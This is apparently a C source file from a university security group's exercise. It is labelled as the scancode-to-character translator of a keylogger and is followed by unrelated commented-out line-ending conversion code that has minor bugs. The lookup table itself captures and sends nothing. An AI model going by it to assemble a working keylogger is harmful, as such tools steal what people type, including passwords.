/*
 * Universidade Federal do Rio de Janeiro
 * PS-GRIS
 * Autor: Pedro Jullian Medina Torres Graca
 * TAG:	Malware
 * Aplicador: José
 * Descricao: tradutor do keylloger
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger.h"

tipoErros
tradutor (byte buffer[COMPRIMENTO_BUFFER], char *saida)
{
	switch (buffer[0])
	{
		case 0x1e :
			*saida='a';
			return ok;
		break;

		case 0x30:
			*saida='b';
			return ok;
		break;
		
		case 0x2e:
			*saida='c';
			return ok;
		break;

		case 0x20:
			*saida='d';
			return ok;
		break;

		case 0x12:
			*saida='e';
			return ok;
		break;

		case 0x21:
			*saida='f';
			return ok;
		break;

		case 0x22:
			*saida='g';
			return ok;
		break;

		case 0x23:
			*saida='h';
			return ok;
		break;

		case 0x17:
			*saida='i';
			return ok;
		break;

		case 0x24:
			*saida='j';
			return ok;
		break;

		case 0x25:
			*saida='k';
			return ok;
		break;

		case 0x26:
			*saida='l';
			return ok;
		break;
		
		case 0x32:
			*saida='m';
			return ok;
		break;

		case 0x31:
			*saida='n';
			return ok;
		break;
		
		case 0x18:
			*saida='o';
			return ok;
		break;

		case 0x19:
			*saida='p';
			return ok;
		break;

		case 0x10:
			*saida='q';
			return ok;
		break;

		case 0x13:
			*saida='r';
			return ok;
		break;

		case 0x1f:
			*saida='s';
			return ok;
		break;

		case 0x14:
			*saida='t';
			return ok;
		break;

		case 0x16:
			*saida='u';
			return ok;
		break;

		case 0x2f:
			*saida='v';
			return ok;
		break;

		case 0x11:
			*saida='w';
			return ok;
		break;
		
		case 0x2d:
			*saida='x';
			return ok;
		break;

		case 0x15:
			*saida='y';
			return ok;
		break;

		case 0x2c:
			*saida='z';
			return ok;
		break;

		case 0x02:
			*saida='1';
			return ok;
		break;

		case 0x03:
			*saida='2';
			return ok;
		break;

		case 0x04:
			*saida='3';
			return ok;
		break;

		case 0x05:
			*saida='4';
			return ok;
		break;

		case 0x06:
			*saida='5';
			return ok;
		break;
		
		case 0x07:
			*saida='6';
			return ok;
		break;

		case 0x08:
			*saida='7';
			return ok;
		break;
		
		case 0x09:
			*saida='8';
			return ok;
		break;

		case 0x0a:
			*saida='9';
			return ok;
		break;

		case 0x0b:
			*saida='0';
			return ok;
		break;
		
		case 0x1c:
			*saida='\n';
			return ok;
		break;
		
		case 0x60:
			*saida='\n';
			return ok;
		break;

		case 0x0f:
			*saida='\t';
			return ok;
		break;

		case 0x39:
			*saida=' ';
			return ok;
		break;
		
		case 0x28:
			*saida='\\';
			return ok;
		break;

		case 0x62:
			*saida='/';
			return ok;
		break;

		case 0x37:
			*saida='*';
			return ok;
		break;

		case 0x4a:
			*saida='-';
			return ok;
		break;

		case 0x4e:
			*saida='+';
			return ok;
		break;

		case 0x4f:
			*saida='1';
			return ok;
		break;

		case 0x50:
			*saida='2';
			return ok;
		break;

		case 0x51:
			*saida='3';
			return ok;
		break;

		case 0x4b:
			*saida='4';
			return ok;
		break;

		case 0x4c:
			*saida='5';
			return ok;
		break;

		case 0x4d:
			*saida='6';
			return ok;
		break;

		case 0x47:
			*saida='7';
			return ok;
		break;

		case 0x48:
			*saida='8';
			return ok;
		break;

		case 0x49:
			*saida='9';
			return ok;
		break;
		
		case 0x52:
			*saida='0';
			return ok;
		break;

		case 0x53:
			*saida='.';
			return ok;
		break;

		case 0x75:
			*saida='=';
			return ok;
		break;

		default:
			return naoAchado;
	}
	return ok;
}
/*
	arqSaida= fopen (convertidoDos, "w");
	if (arqSaida==NULL)
	{
		printf ("\nNão foi possivel criar o arquivo \"%s\"", convertidoDos);
    printf ("\nErro (#%i): %s\n", errno, strerror (errno));
    fclose (arqEntrada);
		return naoConseguindoAbrirArquivo;
	}
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
	{
		for (indice=0;(linha[indice]!='\n');indice++);

		if (indice>TAMANHO_MAXIMO_LINHA)
		{
			printf ("\nO maximo de caracteres por linha eh de %i e a seguinte linha passou do limite:\n%s",TAMANHO_MAXIMO_LINHA-1,linha);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoDos);
			return passouLimiteLinhas;
		}
		if (indice>0)
			if ((linha[indice]!='\n')||(linha[indice-1]=='\r'))
			{
				printf ("\nO arquivo fornecido \"%s\" nao esta no formato Unix. Por favor altere.\nPara saber como usar essa funcao use a flag -[h|H]",originalUnix);
				fclose (arqEntrada);
				fclose (arqSaida);
				remove (convertidoDos);
				return formatoEntradaIncorreto;
			}
		linha[indice]='\r';
		fprintf(arqSaida,"%s\n",linha);
	}
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",originalUnix);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (convertidoDos);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}
	*/
/*
tipoErros
ConverterArquivoFormatoDosFormatoUnix (char *originalDos, char *convertidoUnix)
{
	if (!originalDos)
		return originalNull;
	if (!convertidoUnix)
		return convertidoNull;

	bit nomesIguais=0;
	unsigned indice,auxiliar;
	FILE *arqEntrada, *arqSaida;
	char linha[200];
	printf ("\nEntrada: %s\tSaida: %s\t",originalDos,convertidoUnix);
	printf ("\nConvertendo Dos para Unix");

	auxiliar=0;
	for (indice=0; originalDos[indice]!=EOS; indice++)
		if (originalDos[indice]==convertidoUnix[indice])
			auxiliar++;
	if (auxiliar==indice)
	{
		convertidoUnix[indice]='A';
		convertidoUnix[indice+1]=EOS;
		nomesIguais=1;
	}
	arqEntrada= fopen (originalDos, "r");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", originalDos);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}

	arqSaida= fopen (convertidoUnix, "w");
	if (arqSaida==NULL)
	{
		printf ("\nNão foi possivel criar o arquivo \"%s\"", convertidoUnix);
    printf ("\nErro (#%i): %s\n", errno, strerror (errno));
    fclose (arqEntrada);
		return naoConseguindoAbrirArquivo;
	}
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
	{
		for (indice=0;(linha[indice]!='\n');indice++);

		if (indice>TAMANHO_MAXIMO_LINHA)
		{
			printf ("\nO maximo de caracteres por linha eh de %i e a seguinte linha passou do limite:\n%s",TAMANHO_MAXIMO_LINHA-1,linha);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoUnix);
			return passouLimiteLinhas;
		}
		if ((linha[indice-1]!='\r')||(linha[indice]!='\n'))
		{
			printf ("\nO arquivo fornecido \"%s\" nao esta no formato Dos. Por favor altere.\nPara saber como usar essa funcao use a flag -[h|H]",originalDos);
			fclose (arqEntrada);
			fclose (arqSaida);
			remove (convertidoUnix);
			return formatoEntradaIncorreto;
		}
		linha[indice-1]='\n';
		linha[indice]='\0';
		fprintf(arqSaida,"%s",linha);
	}
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",originalDos);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (convertidoUnix);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}
	
	if (fclose (arqEntrada)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", originalDos);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}
	
	if (fclose (arqSaida)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", convertidoUnix);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}

	if (nomesIguais==1)
	{
		remove (originalDos);
		copiar (convertidoUnix,originalDos);
		remove (convertidoUnix);
	}
	
	printf ("\nConvertido com sucesso\n\n");
	
	return ok;
}

tipoErros
copiar (char *original, char *copia)
{
	if (!original)
		return originalNull;
	if (!copia)
		return convertidoNull;
	
	FILE *arqEntrada, *arqSaida;

	arqEntrada= fopen (original, "r");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", original);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}
	arqSaida= fopen (copia, "w");
	if (arqEntrada==NULL)
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", copia);
    printf ("\nErro (#%i): %s", errno, strerror (errno));
    return naoConseguindoAbrirArquivo;
	}	
	char linha[200];
	
	while ((fgets(linha,TAMANHO_MAXIMO_LINHA,arqEntrada))!=NULL)
		fprintf(arqSaida,"%s",linha);
	
	if (ferror(arqEntrada))
	{
		printf ("\nErro lendo o Arquivo \"%s\"",original);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		fclose (arqEntrada);
		remove (copia);
		fclose (arqSaida);
		return naoConseguindoLerArquivo;
	}

	if (fclose (arqEntrada)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", original);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}
	
	if (fclose (arqSaida)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", copia);
		printf ("\nErro (#%i): %s", errno, strerror (errno));
		return naoConseguindoFecharArquivo;
	}

	return ok;
}
*/
